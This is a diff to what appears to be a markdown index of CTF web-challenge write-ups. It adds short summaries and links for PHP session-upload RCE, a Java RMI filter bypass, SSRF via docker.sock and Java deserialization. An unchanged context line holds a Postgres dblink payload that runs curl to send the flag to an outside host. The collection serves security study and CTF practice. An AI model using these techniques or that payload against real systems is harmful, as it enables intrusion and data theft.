@@ -733,9 +733,29 @@
     use https://github.com/ambionics/phpggc to build a Monolog gadget chain
     https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club
 
+### one line php - hitcon-ctf-2018
+    php rce through race and lfi
+    fix our session filename via PHP_SESSION_UPLOAD_PROGRESS and PHPSESSID
+    chain php filters to remove `upload_progress_` prefixing our payload
+    http://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html https://ctftime.org/task/6896
+
+### return of one line php - realworld-ctf-2018
+    same but `session.upload_progress.enabled = Off`
+    bruteforce temp filename, prevent autodeletion by segfaulting php 7.2
+    https://ctftime.org/task/7318
+
 ### flaglab - realworld-ctf-2018
     gitlab ssrf CVE-2017-0916 + command injection via redis
     https://desc0n0cid0.blogspot.com/2019/01/chaining-2-low-impact-bugs-into-gitlab.html
+
+### rmi - realworld-ctf-2018
+    rce with RMI RegistryFilter bypasses, which was introduced in Java 8u121
+    https://ctftime.org/writeup/12656
+
+### printmd - realworld-ctf-2018
+    ssrf in Nuxt.js by passing arbitrary Object to `axios()` via http param pollution
+    axios does not support file:// but supports UNIX socket so exfil flag via `/var/run/docker.sock`
+    https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup
 
 ### ublog - hxp-ctf-2018
     css selector timing attack
@@ -1118,6 +1138,10 @@
     recover postgres pw since `hash:=md5(password+username)` and password is only 5 chars long
     run commands with `SELECT dblink('host=0 password=xxxxx','copy(select)to program''curl me/`/readflag`''')
     https://github.com/5lipper/ctf/blob/master/rwctf20-21/dbaasadge.md
+
+### old system - realworld-ctf-2021
+    java deserialization rce in Java 1.4
+    https://github.com/voidfyoo/rwctf-2021-old-system/tree/main/writeup
 
 </p></details>
 <!-- }}} -->
